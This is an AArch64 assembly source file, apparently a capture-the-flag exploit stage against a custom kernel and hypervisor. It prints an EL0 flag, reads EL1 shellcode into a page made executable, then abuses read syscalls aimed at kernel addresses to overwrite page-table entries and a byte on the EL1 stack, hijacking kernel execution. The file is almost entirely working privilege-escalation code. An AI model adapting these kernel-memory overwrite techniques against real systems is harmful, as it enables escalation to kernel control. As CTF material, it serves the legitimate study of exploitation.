.section .text
.global _start
_start:

    # First, call the function to print el0 flag
    ldr x0, =0x400104
    blr x0

    # Allocate a page mapping via mmap
    ldr x0, =0
    ldr x1, =0x1000
    ldr x2, =3
    ldr x3, =0
    ldr x4, =0
    ldr x5, =-1
    mov x8, #0xDE
    svc 0

    # Save off the page
    mov x15, x0

    # Fill the page with our EL1 shellcode
    ldr x14, =0

loop:
    ldr x0, =0
    add x1, x14, x15
    ldr x2, =1
    ldr x8, =0x3f
    svc 0
    add x14, x14, #1
    cmp x14, #0x1000
    bne loop

    # Map the page executable. This way, the vmm will
    # have it marked executable in its own code
    # (via EL2 hypercall that occurs in the el1_mmap function)
    mov x0, x15
    ldr x1, =0x1000
    ldr x2, =4
    ldr x8, =0xe2
    svc 0

    # Now we want to exploit EL1. Overwrite the
    # physical address stored in a page table
    # to give us control over a kernel text page
    # (0xB0000 in bios.bin)
    mov x8, 0x3f
    ldr x0, =0
    ldr x1, =0xffffffffc001e000
    ldr x2, =1
    svc 0
    mov x8, 0x3f
    ldr x0, =0
    ldr x1, =0xffffffffc001e001
    ldr x2, =1
    svc 0
    mov x8, 0x3f
    ldr x0, =0
    ldr x1, =0xffffffffc001e002
    ldr x2, =1
    svc 0
    nop

    # do a 1 byte write to the EL1 stack redirect kernel execution to the overwritten page
    mov x8, 0x3f
    ldr x0, =0
    ldr x1, =0xffffffffc0019bb9
    ldr x2, =1
    svc 0

    # We never return to here
